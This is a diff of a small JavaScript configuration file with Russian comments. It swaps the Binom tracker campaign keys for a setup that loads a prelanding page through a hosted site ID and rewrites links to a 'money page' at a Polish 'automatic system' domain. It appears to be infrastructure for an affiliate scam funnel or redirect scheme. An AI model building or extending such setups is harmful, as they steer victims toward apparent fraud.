@@ -1,8 +1,8 @@
-var binomCampaingKey = 's15yun0z67b7t9btickt'; /*GitHub Test, id:158. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
+var binomCampaingKey = 'cf6renjyso7zdrhjimvy'; /*GitHub Test, id:158. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
 var landingUrl = 'https://serd.site/landing/s_p_m/poland/blog-powodzenia.php'; /*Адрес преленда, который необходимо подгрузить*/
 var gitHubId = 'findyourways'; /*ID созданного в первой части гайда Google-сайта. Только ID, не вся ссылка!*/
 var moneyPageUrl = 'https://lo.blog-powodzenia.biz/automatycznysystem.php/'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
-var landingLoadingId = '7m3fx3qa9r1cgejf2iox';
+var landingLoadingId = 'pju6az11l5kuc26h7zte';
 
 /* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
 
